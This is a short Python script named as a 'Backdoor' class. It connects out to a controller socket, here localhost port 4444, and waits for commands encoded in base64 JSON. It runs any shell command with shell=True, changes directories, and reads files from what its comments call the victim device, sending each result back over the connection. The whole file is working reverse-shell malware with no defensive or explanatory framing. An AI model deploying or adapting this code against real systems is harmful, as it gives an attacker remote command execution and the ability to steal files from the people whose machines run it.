#!/usr/bin/python3

import socket, subprocess, json, os, base64

class Backdoor:
    # Backdoor class
    def __init__(self, address: tuple):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(address)

    def __del__(self):
        self.connection.close()
    
    def reliable_send(self, data):
        # Safety way to send data as json
        json_data = json.dumps(base64.b64encode(json.dumps(data).encode()).decode())
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # Safety way to receive data as json, until everything income
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(base64.b64decode(json.loads(json_data)).decode())
            except ValueError:
                continue
    
    def change_working_directory_to(self, path):
        # Method allows us to change directory
        os.chdir(path)
        return f'[+] Changing working directory to {os.path.abspath(path)}'

    def execute_system_command(self, command):
        # Method which executing command on victim device
        command = " ".join(command)
        return subprocess.check_output(command, shell=True).decode()

    def read_file(self, file_path):
        # Function which read files on victim device
        with open(file_path, 'rb') as file:
            return file.read().decode()

    def run(self):
        # Method which run everythong - receiving, sending, executing, etc.
        while True:
            command = self.reliable_receive()
            if command[0] == 'exit': # Ending connection and script
                self.connection.close()
                exit()
            elif command[0] == 'cd' and len(command) > 1: # Execute changing working directory command and move us to path stored in command[1]
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == 'download':
                command_result = self.read_file(command[1])
            else:
                command_result = self.execute_system_command(command)
            
            self.reliable_send(command_result)

# Example
my_backdoor = Backdoor(('127.0.0.1', 4444))
my_backdoor.run()


